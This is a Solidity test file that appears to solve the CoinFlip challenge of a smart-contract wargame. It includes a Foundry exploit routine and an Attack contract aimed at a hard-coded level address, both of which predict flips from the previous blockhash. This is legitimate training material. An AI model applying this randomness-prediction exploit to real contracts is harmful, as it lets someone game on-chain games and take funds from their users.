// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

// import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.1/contracts/math/SafeMath.sol";

import "./utils/BaseTest.sol";
import "src/levels/CoinFlip.sol";
import "src/levels/CoinFlipFactory.sol";

contract TestCoinFlip is BaseTest {
    CoinFlip private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new CoinFlipFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = CoinFlip(levelAddress);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */
        vm.startPrank(player);

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        while (level.consecutiveWins() < 10) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;

            level.flip(coinFlip == 1 ? true : false);

            utilities.mineBlocks(1);
        }

        vm.stopPrank();
    }
}

// remix snippet
contract Attack {
    CoinFlip public flipper;
    using SafeMath for uint256;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() public {
        flipper = CoinFlip(0x3855e177f21bEcdbcFE619341dd642C01add5bc0);
    }

    // runs w 100% success guess 
    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        bool side = uint256(blockValue.div(FACTOR)) == 1 ? true : false;

        flipper.flip(side);
    }
}
